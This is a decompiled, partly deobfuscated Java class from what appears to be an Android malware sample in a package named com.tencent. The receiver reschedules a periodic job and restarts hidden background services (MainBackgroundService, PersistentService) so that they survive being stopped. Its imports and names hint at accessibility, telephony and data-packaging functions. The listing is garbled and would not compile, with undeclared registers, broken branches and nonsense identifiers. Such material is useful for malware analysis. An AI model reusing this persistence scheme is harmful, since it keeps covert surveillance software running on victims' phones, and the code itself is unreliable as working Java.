package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SensorRestartReceiver
 * Original: Lcom/tencent/SensorRestarterBroadcastReceiver;
 */
public class SensorRestartReceiver extends BroadcastReceiver {

    // === METHODS ===

    public void Constructor() {
        // new BroadcastReceiver()
        return;
    }

    public static void scheduleJob(Context param0) {
        v0 = "jobscheduler";
        v1 = v4.getSystemService("jobscheduler");
        v1 = new ComponentName();
        v2 = PersistentJobService.class;
        // new ComponentName(v4, v2)
        v4 = Build$VERSION.SDK_INT;
        v2 = 100;
        v3 = 24;
        if (v4 < 24) { // goto +19
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, v1)
        v1 = 900000;
        v4.setPeriodic(900000, 100);
        v4 = v4.build();
        // goto (branch)
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, 900000)
        v1 = 15000;
        v4.setPeriodic(15000, 100);
        v4.build();
        "jobscheduler".schedule(v4);
        return;
    }

    public void onReceive(Context param0, Intent param1) {
        SensorRestartReceiver.scheduleJob(v2);
        v0 = v2.getResources();
        v0 = 2131296274;
        v3 = v3.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v3;
        v3 = MainBackgroundService.class;
        BackgroundServiceHelper.removedqtractort40(v3, v2);
        if (v3 == null || v3 == 0) { // goto +22
        v3 = v2.getResources();
        v3 = v3.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v3;
        v3 = new Intent();
        // new Intent(v2, 2131296274)
        v2.startService(v3);
        v3 = PersistentService.class;
        v3 = BackgroundServiceHelper.removedqtractort40(v3, v2);
        if (v3 == null || v3 == 0) { // goto +63
        v3 = new Intent();
        // new Intent(v2, 2131296274)
        v2.startService(v3);
        // goto (branch)
        v2 = 1;
        v0 = Boolean.valueOf(1);
        v0 = 1.booleanValue();
        v0 = 0;
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        return;
    }
}
